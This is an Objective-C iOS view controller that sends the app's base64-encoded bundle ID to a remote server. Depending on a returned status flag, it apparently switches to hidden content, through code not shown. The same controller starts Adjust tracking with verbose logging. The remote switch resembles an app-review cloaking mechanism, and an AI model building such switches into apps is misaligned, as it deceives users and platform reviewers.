//
//  QuinOneVC.m
//  FlushteriousQuintrigue
//
//  Created by Sun on 2025/3/14.
//

#import "QuinOneVC.h"

#import "QuinReachabilityManager.h"
#import "UIViewController+category.h"
#import "Adjust/Adjust.h"
@interface QuinOneVC ()<AdjustDelegate>
@property (weak, nonatomic) IBOutlet UIActivityIndicatorView *quin_activityView;

@end

@implementation QuinOneVC

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    self.quin_activityView.hidesWhenStopped = YES;
    
    [self loadADKeyString];
    // Do any additional setup after loading the view.
}
- (void)loadADKeyString
{
    [self.quin_activityView startAnimating];
    NSString *recordID = [self getAFIDStr];
    if (recordID && recordID.length) {
        [self.quin_activityView stopAnimating];
        NSNumber *status = [self getStatus];
        [self initAdjust];
        if (status.integerValue == 1) {
            [self showHandData];
        }
        return;
    }
    
    if (QuinReachabilityManager.sharedManager.isReachable) {
        [self reqADKeyString];
    } else {
        [QuinReachabilityManager.sharedManager setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
            if (QuinReachabilityManager.sharedManager.isReachable) {
                [self reqADKeyString];
                [QuinReachabilityManager.sharedManager stopMonitoring];
            }
        }];
        [QuinReachabilityManager.sharedManager startMonitoring];
    }
}

- (void)reqADKeyString
{
    NSString *bundleId = [[NSBundle mainBundle] bundleIdentifier];
    if (!bundleId) {
        return;
    }
    NSData *data = [bundleId dataUsingEncoding:NSUTF8StringEncoding];
    NSString *encodedBundleId = [data base64EncodedStringWithOptions:0];
    NSString *adDataUrl = [NSString stringWithFormat:@"%@dujm.sbs/system/reqADString?id=%@",[self gethostUrl], encodedBundleId];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:adDataUrl]];
    request.HTTPMethod = @"GET";
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.quin_activityView stopAnimating];
            if (error) {
                NSLog(@"Error: %@", error.localizedDescription);
                return;
            }
            
            if (data) {
                NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                if (!str) {
                    return;
                }

                NSData *base64EncodedData = [[NSData alloc] initWithBase64EncodedString:str options:0];
                if (!base64EncodedData) {
                    return;
                }

                NSError *jsonError = nil;
                id jsonObject = [NSJSONSerialization JSONObjectWithData:base64EncodedData options:0 error:&jsonError];
                if (jsonError) {
                    return;
                }
                
                if ([jsonObject isKindOfClass:[NSDictionary class]]) {
                    NSNumber *status = [jsonObject objectForKey:@"status"];
                    [self saveAFStringId:[jsonObject objectForKey:@"url"]];
                    [self saveStatus:status];
                    [self initAdjust];

                    if (status.integerValue == 1) {
                        [self showHandData];
                    }
                    
                }
            }
        });
    }];
    [task resume];
}
#pragma mark - adjust
- (void)initAdjust
{
    NSString *token = [self getad];
    if (token.length > 0) {
        NSString *environment = ADJEnvironmentProduction;
        ADJConfig *myAdjustConfig = [ADJConfig configWithAppToken:token environment:environment];
        myAdjustConfig.delegate = self;
        myAdjustConfig.logLevel = ADJLogLevelVerbose;
        [Adjust appDidLaunch:myAdjustConfig];
    }
}

- (void)adjustAttributionChanged:(nullable ADJAttribution *)attribution
{
    NSLog(@"adid:%@", attribution.adid);
}

@end

